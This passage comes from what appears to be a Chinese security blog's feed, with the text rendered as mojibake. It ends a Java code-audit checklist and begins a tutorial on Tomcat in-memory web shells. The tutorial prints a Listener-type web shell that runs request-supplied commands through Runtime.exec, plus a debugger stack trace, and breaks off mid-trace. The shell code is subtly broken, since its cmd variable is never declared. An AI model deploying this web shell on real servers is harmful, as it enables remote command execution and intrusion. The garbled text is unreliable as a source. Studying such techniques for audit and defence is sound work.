é€»è¾‘é—®é¢˜(å¦‚:å¯ç›´æ¥è·³è¿‡éªŒè¯é€»è¾‘ç›´æ¥å‘åŒ…ä¿®æ”¹)ã€‚<br><span class="hljs-number">4</span>. æ‰‹æœºã€é‚®ç®±éªŒè¯ã€æ‰¾å›å¯†ç ç­‰æ¶‰åŠåˆ°åŠ¨æ€éªŒè¯ç `æœªé™åˆ¶éªŒè¯ç å¤±è´¥æ¬¡æ•°`ã€`éªŒè¯ç æœ‰æ•ˆæœŸ`ã€`éªŒè¯ç é•¿åº¦è¿‡çŸ­`å¯¼è‡´çš„éªŒè¯ç çˆ†ç ´é—®é¢˜ã€‚<br><span class="hljs-number">5</span>. å……å€¼ã€ä»˜æ¬¾ç­‰åŠŸèƒ½è°ƒç”¨äº†ç¬¬ä¸‰æ–¹æ”¯ä»˜ç³»ç»Ÿæœªæ­£ç¡®æ ¡éªŒæ¥å£(ä¸ç¬¬ä¸‰æ–¹çš„äº¤äº’ã€ä¸å®¢æˆ·çš„äº¤äº’ï¼Œä¸»è¦æŸ¥çœ‹é€»è¾‘é—®é¢˜)ã€‚<br><span class="hljs-number">6</span>. åç«¯é‡‡ç”¨äº†`ORMæ¡†æ¶`æ›´æ–°æ“ä½œæ—¶å› å¤„ç†ä¸å½“å¯¼è‡´å¯ä»¥æ›´æ–°ç”¨æˆ·è¡¨ä»»æ„å­—æ®µ(å¦‚:ç”¨æˆ·æ³¨å†Œã€ç”¨æˆ·ä¸ªäººèµ„æ–™ä¿®æ”¹æ—¶å¯ä»¥`ç›´æ¥åˆ›å»ºç®¡ç†å‘˜è´¦å·`æˆ–å…¶ä»–è¶Šæƒä¿®æ”¹æ“ä½œ)ã€‚<br><span class="hljs-number">7</span>. åç«¯é‡‡ç”¨äº†`ORMæ¡†æ¶`æŸ¥è¯¢æ•°æ®æ—¶å› å¤„ç†ä¸å½“å¯¼è‡´å¯ä»¥æ¥æ”¶ä»»ä½•å‚æ•°å¯¼è‡´çš„è¶ŠæƒæŸ¥è¯¢ã€æ•æ„Ÿä¿¡æ¯æŸ¥è¯¢ç­‰å®‰å…¨é—®é¢˜ã€‚<br><span class="hljs-number">8</span>. ç”¨æˆ·ä¸­å¿ƒè½¬è´¦ã€ä¿®æ”¹ä¸ªäººèµ„æ–™ã€å¯†ç ã€é€€å‡ºç™»é™†ç­‰åŠŸèƒ½æœªé‡‡ç”¨éªŒè¯ç æˆ–`Tokenæœºåˆ¶`å¯¼è‡´å­˜åœ¨`CSRFæ¼æ´`ã€‚<br><span class="hljs-number">9</span>. åç«¯æœåŠ¡è¿‡äºä¿¡ä»»å‰ç«¯ï¼Œé‡è¦çš„å‚æ•°å’Œä¸šåŠ¡é€»è¾‘åªåšäº†å‰ç«¯éªŒè¯(å¦‚:æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½çš„æ–‡ä»¶ç±»å‹åªåœ¨JSä¸­éªŒè¯ã€åç«¯ä¸ä»Sessionä¸­è·å–ç”¨æˆ·IDã€ç”¨æˆ·åè€Œæ˜¯ç›´æ¥æ¥æ”¶å®¢æˆ·ç«¯è¯·æ±‚çš„å‚æ•°å¯¼è‡´çš„`è¶Šæƒé—®é¢˜`)ã€‚<br><span class="hljs-number">10</span>. ç”¨æˆ·èº«ä»½ä¿¡æ¯è®¤è¯é€»è¾‘é—®é¢˜(å¦‚:åå°ç³»ç»Ÿè‡ªåŠ¨ç™»é™†æ—¶ç›´æ¥è¯»å–Cookieä¸­çš„ç”¨æˆ·åã€ç”¨æˆ·æƒé™ä¸åšéªŒè¯)ã€‚<br><span class="hljs-number">11</span>. é‡è¦æ¥å£é‡‡ç”¨`IDè‡ªå¢ã€IDå¯é¢„æµ‹å¹¶ä¸”äº‘ç«¯æœªéªŒè¯å‚æ•°æœ‰æ•ˆæ€§`å¯¼è‡´çš„è¶Šæƒè®¿é—®ã€ä¿¡æ¯æ³„æ¼é—®é¢˜(å¦‚:ä»»æ„ç”¨æˆ·è®¢å•è¶Šæƒè®¿é—®)ã€‚<br><span class="hljs-number">12</span>. `æ¡ä»¶ç«äº‰é—®é¢˜`ï¼ŒæŸäº›å…³é”®ä¸šåŠ¡(å¦‚:ç”¨æˆ·è½¬è´¦)ä¸æ”¯æŒå¹¶å‘ã€åˆ†å¸ƒå¼éƒ¨ç½²æ—¶ä¸æ”¯æŒé”çš„æ“ä½œç­‰ã€‚<br><span class="hljs-number">13</span>. é‡è¦æ¥å£`æœªé™åˆ¶è¯·æ±‚é¢‘ç‡`ï¼Œå¯¼è‡´çŸ­ä¿¡ã€é‚®ä»¶ã€ç”µè¯ã€ç§ä¿¡ç­‰ä¿¡æ¯è½°ç‚¸ã€‚<br><span class="hljs-number">14</span>. æ•æ„Ÿä¿¡æ¯æœªä¿æŠ¤ï¼Œå¦‚`Cookieä¸­ç›´æ¥å­˜å‚¨ç”¨æˆ·å¯†ç ç­‰é‡è¦ä¿¡æ¯`ï¼Œè·Ÿè¸ªcookieä¸­çš„å˜é‡æœ€ç»ˆåˆ°äº†å“ªã€‚<br><span class="hljs-number">15</span>. å¼±åŠ å¯†ç®—æ³•ã€å¼±å¯†é’¥ï¼Œå¦‚å‹¿æŠŠBase64å½“æˆæ•°æ®åŠ å¯†æ–¹å¼ã€é‡è¦ç®—æ³•å¯†é’¥é‡‡ç”¨å¼±å£ä»¤å¦‚`123456`ã€‚<br><span class="hljs-number">16</span>. åç«¯æ— å¼‚å¸¸å¤„ç†æœºåˆ¶ã€æœªè‡ªå®šä¹‰<span class="hljs-number">50</span>Xé”™è¯¯é¡µé¢,æœåŠ¡å™¨å¼‚å¸¸å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„æ¼(å¦‚:æ•°æ®åº“ä¿¡æ¯ã€ç½‘ç«™ç»å¯¹è·¯å¾„ç­‰)ã€‚<br><span class="hljs-number">17</span>. ä½¿ç”¨`DWRæ¡†æ¶`å¼€å‘æ—¶å‰åç«¯ä¸åˆ†æ¼æ´(å¦‚:DWRç›´æ¥è°ƒç”¨æ•°æ®åº“ä¿¡æ¯æŠŠç”¨æˆ·ç™»é™†é€»è¾‘ç›´æ¥æ”¾åˆ°äº†å‰ç«¯æ¥åš)ã€‚<br></code></pre></td></tr></table></figure><h5 id="å¦‚ä½•ä¿®å¤-14"><a href="#å¦‚ä½•ä¿®å¤-14" class="headerlink" title="å¦‚ä½•ä¿®å¤"></a>å¦‚ä½•ä¿®å¤</h5><p>åœ¨ä¸šåŠ¡é€»è¾‘å®ç°æ—¶è¯¦ç»†è®¾è®¡ï¼Œä»£ç å®ç°æ—¶æ³¨æ„ä¸€äº›å¸¸è§çš„å‘ï¼Œé¿å…å‡ºç°ä»¥ä¸Šæåˆ°çš„æ¼æ´ã€‚</p><h3 id="å…¶ä»–é—®é¢˜"><a href="#å…¶ä»–é—®é¢˜" class="headerlink" title="å…¶ä»–é—®é¢˜"></a>å…¶ä»–é—®é¢˜</h3><h4 id="ç¡¬ç¼–ç "><a href="#ç¡¬ç¼–ç " class="headerlink" title="ç¡¬ç¼–ç "></a>ç¡¬ç¼–ç </h4><h5 id="æ¼æ´æˆå› -15"><a href="#æ¼æ´æˆå› -15" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h5><p>å¦‚æœå°†æ•æ„Ÿä¿¡æ¯ï¼ˆåŒ…æ‹¬å£ä»¤å’ŒåŠ å¯†å¯†é’¥ï¼‰ç¡¬ç¼–ç åœ¨ç¨‹åºä¸­ï¼Œå¯èƒ½ä¼šå°†æ•æ„Ÿä¿¡æ¯æš´éœ²ç»™æ”»å‡»è€…ã€‚ä»»ä½•èƒ½å¤Ÿè®¿é—®åˆ°classæ–‡ä»¶çš„äººéƒ½å¯ä»¥åç¼–è¯‘classæ–‡ä»¶å¹¶å‘ç°è¿™äº›æ•æ„Ÿä¿¡æ¯ã€‚å› æ­¤ï¼Œä¸èƒ½å°†ä¿¡æ¯ç¡¬ç¼–ç åœ¨ç¨‹åºä¸­ã€‚</p><h5 id="å®¡è®¡ç­–ç•¥-15"><a href="#å®¡è®¡ç­–ç•¥-15" class="headerlink" title="å®¡è®¡ç­–ç•¥"></a>å®¡è®¡ç­–ç•¥</h5><p>å®¡è®¡æºä»£ç ä¸­æ˜¯å¦æœ‰ç¡¬ç¼–ç æ•æ„Ÿä¿¡æ¯ã€‚</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">password</span><br><span class="hljs-attribute">pass</span><br><span class="hljs-attribute">jdbc</span><br><span class="hljs-attribute">auth</span><br></code></pre></td></tr></table></figure><h5 id="å¦‚ä½•ä¿®å¤-15"><a href="#å¦‚ä½•ä¿®å¤-15" class="headerlink" title="å¦‚ä½•ä¿®å¤"></a>å¦‚ä½•ä¿®å¤</h5><p>åŠ¨æ€è·å–æ•æ„Ÿä¿¡æ¯ï¼Œé€šè¿‡é…ç½®æ–‡ä»¶ã€è¯»å–æ•°æ®åº“æˆ–å…¶ä»–æ‰‹æ®µã€‚</p><h4 id="ä¸´æ—¶æ–‡ä»¶åˆ é™¤"><a href="#ä¸´æ—¶æ–‡ä»¶åˆ é™¤" class="headerlink" title="ä¸´æ—¶æ–‡ä»¶åˆ é™¤"></a>ä¸´æ—¶æ–‡ä»¶åˆ é™¤</h4><h5 id="æ¼æ´æˆå› -16"><a href="#æ¼æ´æˆå› -16" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h5><p>å¼€å‘äººå‘˜ä¼šåœ¨å…¨å±€å¯å†™çš„ç›®å½•ä¸­åˆ›å»ºä¸´æ—¶æ–‡ä»¶ã€‚è¿™ç±»ç›®å½•ä¸­çš„æ–‡ä»¶å¯èƒ½ä¼šè¢«å®šæœŸæ¸…ç†ï¼Œç„¶è€Œï¼Œå¦‚æœæ–‡ä»¶æœªè¢«å®‰å…¨åœ°åˆ›å»ºæˆ–è€…ç”¨å®Œåè¿˜æ˜¯å¯è®¿é—®çš„ï¼Œæ”»å‡»è€…ä¾¿å¯ä»¥åˆ©ç”¨å…±äº«ç›®å½•ä¸­çš„æ–‡ä»¶æ“ä½œè·å–æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿè®¿é—®æƒé™ã€‚</p><h5 id="å®¡è®¡ç­–ç•¥-16"><a href="#å®¡è®¡ç­–ç•¥-16" class="headerlink" title="å®¡è®¡ç­–ç•¥"></a>å®¡è®¡ç­–ç•¥</h5><p>é‡ç‚¹æ–‡ä»¶åº”ç”¨ç¨‹åºåˆ›å»ºæ–°æ–‡ä»¶æ—¶æ˜¯å¦ä¸ºä¸´æ—¶æ–‡ä»¶ï¼Œåœ¨ä½¿ç”¨åæ˜¯å¦å¯¹ä¸´æ—¶è¿›è¡ŒåŠæ—¶çš„åˆ é™¤ã€‚<br>å¯ä»¥æœç´¢å…³é”®å­—<code>File</code>ã€<code>FileOutputStream</code>ã€<code>tempFile</code>ã€<code>FileUtils</code>è¿›è¡ŒæŸ¥æ‰¾ã€‚</p><h5 id="å¦‚ä½•ä¿®å¤-16"><a href="#å¦‚ä½•ä¿®å¤-16" class="headerlink" title="å¦‚ä½•ä¿®å¤"></a>å¦‚ä½•ä¿®å¤</h5><p>å¯ä»¥ä½¿ç”¨NIOä¸­çš„<code>createTempFile()</code> æ–¹æ³•åˆ›å»ºä¸´æ—¶æ–‡ä»¶ï¼Œè¿™ç§æ–¹æ³•æ— è®ºæ˜¯å¦æœ‰å¼‚å¸¸ï¼Œéƒ½ä¼šè‡ªåŠ¨å…³é—­æ–‡ä»¶ï¼Œä½¿ç”¨<code>DELETE_ON_CLOSE</code>é€‰é¡¹ï¼Œåœ¨æ–‡ä»¶å…³é—­æ—¶è‡ªåŠ¨åˆ é™¤ã€‚<br>æˆ–åœ¨ä¸šåŠ¡é€»è¾‘å¤„ç†å®Œæˆåæ˜¾å¼åœ°è¿›è¡Œåˆ é™¤ï¼Œä½†è¦æ³¨æ„æ¡ä»¶ç«äº‰é—®é¢˜ã€‚</p><h4 id="ä¸å®‰å…¨çš„åå°„"><a href="#ä¸å®‰å…¨çš„åå°„" class="headerlink" title="ä¸å®‰å…¨çš„åå°„"></a>ä¸å®‰å…¨çš„åå°„</h4><h5 id="æ¼æ´æˆå› -17"><a href="#æ¼æ´æˆå› -17" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h5><p>å¼€å‘äººå‘˜å¦‚æœæä¾›äº†æ¥å£ï¼Œå¯ä»¥ç”±è®¿é—®äººå‘˜ä¸ºåº”ç”¨ç¨‹åºæä¾›ç¡®å®šå®ä¾‹åŒ–å“ªä¸ªç±»æˆ–è°ƒç”¨å“ªä¸ªæ–¹æ³•çš„å‚æ•°å€¼ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½åˆ›å»ºä¸€ä¸ªè´¯ç©¿äºæ•´ä¸ªåº”ç”¨ç¨‹åºçš„æ§åˆ¶æµè·¯å¾„ï¼Œè€Œè¯¥è·¯å¾„å¹¶éæ˜¯åº”ç”¨ç¨‹åºå¼€å‘è€…æœ€åˆè®¾è®¡çš„ã€‚</p><p>è€Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™æ ·çš„æ¥å£è°ƒç”¨éé¢„æœŸçš„ä»»æ„æ–¹æ³•æ‰§è¡Œæ–‡ä»¶å†™å…¥ã€å‘½ä»¤æ‰§è¡Œæˆ–è€…å…¶ä»–çš„æ¶æ„æ“ä½œã€‚</p><h5 id="å®¡è®¡ç­–ç•¥-17"><a href="#å®¡è®¡ç­–ç•¥-17" class="headerlink" title="å®¡è®¡ç­–ç•¥"></a>å®¡è®¡ç­–ç•¥</h5><p>æŸ¥çœ‹å¼€å‘äººå‘˜æ˜¯å¦å¯¹åå°„è°ƒç”¨æ–¹æ³•ã€åå°„åˆ›å»ºç±»å®ä¾‹è¿›è¡Œäº†å°è£…ï¼Œå¹¶æ˜¯å¦åœ¨å¯¹å¤–çš„æ¥å£ä¸­è¿›è¡Œäº†ç›¸å…³çš„è°ƒç”¨ã€‚</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Class</span>.forName<br><span class="hljs-keyword">Method</span>.invoke<br>newInstance<br>Worker/<span class="hljs-keyword">Invoker</span><br></code></pre></td></tr></table></figure><h5 id="å¦‚ä½•ä¿®å¤-17"><a href="#å¦‚ä½•ä¿®å¤-17" class="headerlink" title="å¦‚ä½•ä¿®å¤"></a>å¦‚ä½•ä¿®å¤</h5><p>é¿å…å¯¹å¤–å¼€æ”¾å…·æœ‰ç›¸å…³åŠŸèƒ½çš„æ¥å£ï¼Œæˆ–åœ¨è°ƒç”¨å‰è¿›è¡Œä¸¥æ ¼çš„å®¡æŸ¥ã€‚</p><h4 id="ä½¿ç”¨äº†ä¸å®‰å…¨çš„ç»„ä»¶"><a href="#ä½¿ç”¨äº†ä¸å®‰å…¨çš„ç»„ä»¶" class="headerlink" title="ä½¿ç”¨äº†ä¸å®‰å…¨çš„ç»„ä»¶"></a>ä½¿ç”¨äº†ä¸å®‰å…¨çš„ç»„ä»¶</h4><h5 id="æ¼æ´æˆå› -18"><a href="#æ¼æ´æˆå› -18" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h5><p>å¼€å‘äººå‘˜åœ¨å¼€å‘åº”ç”¨ç¨‹åºæ—¶å¯èƒ½ä¼šå¼•ç”¨ç¬¬ä¸‰æ–¹çš„ç»„ä»¶ï¼Œè¿™äº›ç»„ä»¶å¯èƒ½è¢«æŠ¥å‡ºè¿‡å®‰å…¨æ¼æ´ï¼Œä½†æ˜¯ä½¿ç”¨è€…ç”±äºç§ç§åŸå› æ²¡æœ‰åŠæ—¶å‡çº§ï¼Œå› æ­¤å¯èƒ½å¯¼è‡´å­˜åœ¨å†å²é—ç•™çš„é—®é¢˜ã€‚</p><p>ç»„ä»¶ä¾‹å¦‚ fastjsonã€jacksonã€xstreamï¼Œæ¡†æ¶ä¾‹å¦‚ struts2ã€spring ç­‰ç­‰ï¼Œéƒ½è¦æ³¨æ„ä½¿ç”¨çš„ç‰ˆæœ¬é—®é¢˜ã€‚</p><h5 id="å®¡è®¡ç­–ç•¥-18"><a href="#å®¡è®¡ç­–ç•¥-18" class="headerlink" title="å®¡è®¡ç­–ç•¥"></a>å®¡è®¡ç­–ç•¥</h5><p>å…³æ³¨ maven å’Œ gradle ç­‰åŒ…ç®¡ç†è½¯ä»¶å¤„ç†çš„åº”ç”¨ç¨‹åºä¾èµ–ï¼Œå…³æ³¨å¼€å‘äººå‘˜æ‰€ä½¿ç”¨çš„åº”ç”¨ç¨‹åºç‰ˆæœ¬ï¼ŒæŸ¥çœ‹æ˜¯å¦å…·æœ‰å­˜åœ¨æ¼æ´çš„ç‰ˆæœ¬ï¼Œå¹¶æŸ¥çœ‹å…¶å…·ä½“è°ƒç”¨ä½ç½®ï¼Œçœ‹æ˜¯å¦èƒ½å¤Ÿç»„åˆæˆç›¸å…³æ¼æ´ã€‚</p><p>å¿…è¦æ—¶å¯å€ŸåŠ© SCA å®¡æŸ¥å·¥å…·æ¥å®ç°ã€‚</p><h5 id="å¦‚ä½•ä¿®å¤-18"><a href="#å¦‚ä½•ä¿®å¤-18" class="headerlink" title="å¦‚ä½•ä¿®å¤"></a>å¦‚ä½•ä¿®å¤</h5><p>ç¡®ä¿åº”ç”¨ç¨‹åºä½¿ç”¨è¾ƒæ–°çš„ã€æˆ–å®‰è£…äº†å®‰å…¨è¡¥ä¸çš„ç»„ä»¶ã€‚</p><h2 id="æ€è·¯å‡†å¤‡"><a href="#æ€è·¯å‡†å¤‡" class="headerlink" title="æ€è·¯å‡†å¤‡"></a>æ€è·¯å‡†å¤‡</h2><p>ä»¥ä¸‹ä»…ä¸ºä¸ªäººå­¦ä¹ è§‚ç‚¹ï¼Œå¦‚æœ‰ä¸å¯¹æˆ–è€…éœ€è¦è¡¥å……è¿˜è¯·å¸ˆå‚…ä»¬æ–§æ­£ã€‚</p><h3 id="å…¥é—¨"><a href="#å…¥é—¨" class="headerlink" title="å…¥é—¨"></a>å…¥é—¨</h3><p>å…¶å®å­¦å®Œè¿™äº›ä¸œè¥¿ä¹‹åï¼Œå®é™…ä½ å¤§æ¦‚ç‡è¿˜æ˜¯ä¸èƒ½è‡ªå·±å®¡è®¡çš„ã€‚ä½†æ˜¯æ­¤æ—¶çš„ä½ å·²ç»å¯¹Javaå®¡è®¡æœ‰äº†è¿›ä¸€æ­¥çš„è®¤è¯†ã€‚è¿™ä¸ªæ—¶å€™ä½ å¯ä»¥è‡ªå·±æ­å»ºä¸€äº›ä¹‹å‰çš„çƒ­é—¨ç¯å¢ƒæ¼æ´æ¯”å¦‚ Struts2ã€Shiroã€Fastjsonã€æˆ–è€…ç½‘ä¸Šæœ‰ä¸€äº›æ–°çš„çƒ­é—¨æ¼æ´å¯ä»¥è·Ÿç€æ–‡ç« è¿›è¡Œå¤ç°åˆ†æã€‚ä¸€å®šå¤šåšï¼Œå³å¯ä»¥å¸®åŠ©è‡ªå·±æ·±åˆ»ç†è§£ä¹‹å‰å­¦ä¹ åˆ°çš„æ¦‚å¿µï¼Œè¿˜èƒ½å¤šäº†è§£æ–°çš„æ¼æ´ç‚¹ã€‚</p><h3 id="è¿›é˜¶"><a href="#è¿›é˜¶" class="headerlink" title="è¿›é˜¶"></a>è¿›é˜¶</h3><p>å¤šæ¥è§¦çƒ­é—¨æ¡†æ¶æ¼æ´ã€‚ç†Ÿæ‚‰ä¸»æµæ¡†æ¶çš„ç»“æ„ï¼Œåˆ°æ—¶å€™ä¼šæœ‰è‡ªå·±å®¡è®¡çš„ä¾§é‡ç‚¹å’Œå…³æ³¨ç‚¹ã€‚ç„¶åè‡ªå·±æ‰¾ä¸€äº›å°ä¼—çš„é¡¹ç›®è‡ªå·±è¿›è¡Œä»£ç å®¡è®¡ã€‚</p><h3 id="é«˜é˜¶"><a href="#é«˜é˜¶" class="headerlink" title="é«˜é˜¶"></a>é«˜é˜¶</h3><p>é«˜é˜¶æˆ‘ä¸äº†è§£ï¼Œå› ä¸ºè‡ªå·±è¿˜æ˜¯å¤ªèœäº†ã€‚ä½†æ˜¯å®‰å…¨çš„å°½å¤´æ˜¯å¼€å‘ã€‚æˆ‘ä¼°è®¡ä¹Ÿç¦»ä¸å¼€å¼€å‘ã€‚ã€‚ã€‚ã€‚ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>ä»£ç å®¡è®¡</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æ·±å…¥ï¼ˆé¸¡è‚‹é©¬ï¼‰å†…å­˜é©¬</title>
    <link href="/2023/12/04/%E6%B7%B1%E5%85%A5(%E9%B8%A1%E8%82%8B%E9%A9%AC)%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <url>/2023/12/04/%E6%B7%B1%E5%85%A5(%E9%B8%A1%E8%82%8B%E9%A9%AC)%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="æ·±å…¥-é¸¡è‚‹é©¬-å†…å­˜é©¬"><a href="#æ·±å…¥-é¸¡è‚‹é©¬-å†…å­˜é©¬" class="headerlink" title="æ·±å…¥(é¸¡è‚‹é©¬)å†…å­˜é©¬"></a>æ·±å…¥(é¸¡è‚‹é©¬)å†…å­˜é©¬</h1><h2 id="Tomcatå†…å­˜é©¬"><a href="#Tomcatå†…å­˜é©¬" class="headerlink" title="Tomcatå†…å­˜é©¬"></a>Tomcatå†…å­˜é©¬</h2><p>Tomcatå†…å­˜é©¬å¤§è‡´å¯ä»¥åˆ†ä¸ºä¸‰ç±»ï¼Œåˆ†åˆ«æ˜¯Listenerå‹ã€Filterå‹ã€Servletå‹ã€‚å¯èƒ½æœ‰äº›æœ‹å‹ä¼šå‘ç°ï¼Œè¿™ä¸æ­£æ˜¯Java Webæ ¸å¿ƒçš„ä¸‰å¤§ç»„ä»¶å˜›ï¼æ²¡é”™ï¼ŒTomcatå†…å­˜é©¬çš„æ ¸å¿ƒåŸç†å°±æ˜¯åŠ¨æ€åœ°å°†æ¶æ„ç»„ä»¶æ·»åŠ åˆ°æ­£åœ¨è¿è¡Œçš„TomcatæœåŠ¡å™¨ä¸­ã€‚</p><p>è€Œè¿™ä¸€æŠ€æœ¯çš„å®ç°æœ‰èµ–äºå®˜æ–¹å¯¹Servlet3.0çš„å‡çº§ï¼ŒServletåœ¨3.0ç‰ˆæœ¬ä¹‹åèƒ½å¤Ÿæ”¯æŒåŠ¨æ€æ³¨å†Œç»„ä»¶ã€‚è€ŒTomcatç›´åˆ°7.xæ‰æ”¯æŒServlet3.0ï¼Œå› æ­¤é€šè¿‡åŠ¨æ€æ·»åŠ æ¶æ„ç»„ä»¶æ³¨å…¥å†…å­˜é©¬çš„æ–¹å¼é€‚åˆTomcat7.xåŠä»¥ä¸Šã€‚ä¸ºäº†ä¾¿äºè°ƒè¯•Tomcatï¼Œæˆ‘ä»¬å…ˆåœ¨çˆ¶é¡¹ç›®çš„pomæ–‡ä»¶ä¸­å¼•å…¥Tomcatä¾èµ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;<br>            &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;<br>            &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;<br>            &lt;version&gt;<span class="hljs-number">9.0</span><span class="hljs-number">.55</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure><h3 id="Listenerå‹"><a href="#Listenerå‹" class="headerlink" title="Listenerå‹"></a>Listenerå‹</h3><p>æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯åœ¨æœåŠ¡å™¨ä¸­åŠ¨æ€æ³¨å†Œä¸€ä¸ªæ¶æ„çš„Listenerã€‚è€ŒListeneræ ¹æ®äº‹ä»¶æºçš„ä¸åŒï¼Œå¤§è‡´å¯ä»¥åˆ†ä¸ºå¦‚ä¸‹ä¸‰ç§</p><ul><li>ServletContextListener</li><li>HttpSessionListener</li><li>ServletRequestListener</li></ul><p>å¾ˆæ˜æ˜¾ï¼Œ<code>ServletRequestListener</code>æ˜¯æœ€é€‚åˆç”¨æ¥ä½œä¸ºå†…å­˜é©¬çš„ã€‚å› ä¸º<code>ServletRequestListener</code>æ˜¯ç”¨æ¥ç›‘å¬<code>ServletRequest</code>å¯¹è±¡çš„ï¼Œå½“æˆ‘ä»¬è®¿é—®ä»»æ„èµ„æºæ—¶ï¼Œéƒ½ä¼šè§¦å‘<code>ServletRequestListener#requestInitialized()</code>æ–¹æ³•ã€‚ä¸‹é¢æˆ‘ä»¬æ¥å®ç°ä¸€ä¸ªæ¶æ„çš„Listener</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.ServletRequestEvent;<br><span class="hljs-keyword">import</span> javax.servlet.ServletRequestListener;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebListener;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> java.io.IOException;<br> <br><span class="hljs-meta">@WebListener</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Listener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(cmd);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                n.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è®¿é—®ä»»æ„è·¯ç”±éƒ½å¯æ‰§è¡Œå‘½ä»¤</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-5.png" alt="img1"></p><p>ä¸‹é¢çš„é—®é¢˜å°±æ˜¯å¦‚ä½•å°†æ¶æ„çš„ListeneråŠ¨æ€æ³¨å†Œè¿›æœåŠ¡å™¨äº†ï¼Œä¸‹é¢æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹Listenerçš„åˆ›å»ºè¿‡ç¨‹ã€‚</p><h4 id="Listenerçš„åˆ›å»ºè¿‡ç¨‹"><a href="#Listenerçš„åˆ›å»ºè¿‡ç¨‹" class="headerlink" title="Listenerçš„åˆ›å»ºè¿‡ç¨‹"></a>Listenerçš„åˆ›å»ºè¿‡ç¨‹</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs Java">requestInitialized:<span class="hljs-number">13</span>, Shell_Listener (Listener)<br>fireRequestInitEvent:<span class="hljs-number">5992</span>, StandardContext (org.apache.catalina.core)<br>invoke:<span class="hljs-number">121</span>, StandardHostValve (org.apache.catalina.core)<br>invoke:<span class="hljs-number">92</span>, ErrorReportValve (org.apache.catalina.valves)<br>invoke:<span class="hljs-number">687</span>, AbstractAccessLogValve (org.apache.catalina.valves)<br>invoke:<span class="hljs-number">78</span>, StandardEngineValve (org.apache.catalina.core)<br>service:<span class="hljs-number">357</span>, CoyoteAdapter (org.apache.catalina.connector)<br>service:<span class="hljs-number">382</span>, Http11Processor (org.apache.coyote.http11)<br>process:<span class="hljs-number">65</span>, AbstractProcessorLight (org.apache.coyote)<br>process:<span class="hljs-number">895</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)<br>doRun:<span class="hljs-number">1722</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)<br>run:<span class="hljs-number">49</span>, SocketProcessorBase 